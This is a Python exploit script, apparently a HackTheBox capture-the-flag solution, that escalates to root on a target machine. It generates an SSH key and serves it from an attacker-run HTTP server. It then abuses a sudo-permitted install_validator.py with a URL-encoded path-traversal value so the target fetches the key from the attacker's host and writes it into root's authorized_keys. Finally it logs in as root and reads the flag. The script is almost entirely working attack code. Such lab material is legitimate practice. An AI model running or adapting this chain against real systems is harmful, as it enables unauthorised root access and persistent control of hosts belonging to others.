#!/usr/bin/env python3
"""
Phase 4: Privilege Escalation to root
VariaType (Avatar) CTF - HackTheBox
Exploits install_validator.py path traversal
"""

import subprocess
import time
import os
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading

def generate_root_key():
    """Generate SSH key for root"""
    print("[*] Generating SSH key for root...")
    subprocess.run(["ssh-keygen", "-t", "ed25519", "-f", "/tmp/root_key",
                   "-N", "", "-C", "root@pwn"], capture_output=True)
    print("[+] Key generated: /tmp/root_key")

def start_key_server():
    """Start HTTP server to serve root public key"""
    print("[*] Starting HTTP server for root key...")
    
    with open("/tmp/root_key.pub", "rb") as f:
        key_data = f.read()
    
    class KeyHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Length", str(len(key_data)))
            self.end_headers()
            self.wfile.write(key_data)
        def log_message(self, format, *args):
            pass  # Suppress logs
    
    server = HTTPServer(("0.0.0.0", 8889), KeyHandler)
    thread = threading.Thread(target=server.serve_forever)
    thread.daemon = True
    thread.start()
    
    print("[+] Server running on port 8889")
    return server

def exploit_path_traversal():
    """Exploit sudo with URL-encoded absolute path"""
    print("[*] Exploiting install_validator.py...")
    print("[*] Using path traversal: %2Froot%2F.ssh%2Fauthorized_keys")
    
    RHOST = "<Target_IP>"
    LHOST = "<Your_IP_Address>"
    
    cmd = [
        "ssh", "-o", "StrictHostKeyChecking=no",
        "-i", "/tmp/steve_key",
        f"steve@{RHOST}",
        f"sudo /usr/bin/python3 /opt/font-tools/install_validator.py 'http://{LHOST}:8889/%2Froot%2F.ssh%2Fauthorized_keys'"
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    if "installed" in result.stdout.lower() or "success" in result.stdout.lower():
        print("[+] Exploit successful!")
        print(f"    Output: {result.stdout}")
        return True
    else:
        print("[!] Exploit may have failed")
        print(f"    stdout: {result.stdout}")
        print(f"    stderr: {result.stderr}")
        # Continue anyway - might have worked
        return True

def verify_root_ssh():
    """Verify SSH access as root"""
    print("[*] Testing SSH as root...")
    
    RHOST = "<Target_IP>"
    
    # Test connection
    result = subprocess.run(
        ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5",
         "-i", "/tmp/root_key", f"root@{RHOST}", "whoami"],
        capture_output=True, text=True
    )
    
    if "root" in result.stdout:
        print("[+] SSH as root successful!")
        
        # Get root flag
        result = subprocess.run(
            ["ssh", "-o", "StrictHostKeyChecking=no", "-i", "/tmp/root_key",
             f"root@{RHOST}", "cat /root/root.txt"],
            capture_output=True, text=True
        )
        root_flag = result.stdout.strip()
        print(f"[+] ROOT FLAG: {root_flag}")
        
        # Save flag
        with open("/tmp/root_flag.txt", "w") as f:
            f.write(root_flag)
        
        return True
    else:
        print("[-] SSH as root failed")
        print(f"    Error: {result.stderr}")
        return False

def main():
    print("="*60)
    print("Phase 4: Privilege Escalation to root")
    print("="*60)
    
    generate_root_key()
    server = start_key_server()
    
    time.sleep(2)  # Let server start
    
    if exploit_path_traversal():
        time.sleep(1)  # Let SSH key get written
        if verify_root_ssh():
            print("\n" + "="*60)
            print("EXPLOITATION COMPLETE!")
            print("="*60)
            print("\n[+] You now have full root access!")
            print("    ssh -i /tmp/root_key root@<Target_IP>")
            
            # Print both flags
            try:
                with open("/tmp/user_flag.txt", "r") as f:
                    print(f"\n[*] User Flag: {f.read().strip()}")
            except:
                pass
            try:
                with open("/tmp/root_flag.txt", "r") as f:
                    print(f"[*] Root Flag: {f.read().strip()}")
            except:
                pass
        else:
            print("\n[-] Root exploit failed. The script might need a different approach.")
    else:
        print("\n[-] Exploit failed")
    
    server.shutdown()

if __name__ == "__main__":
    main()
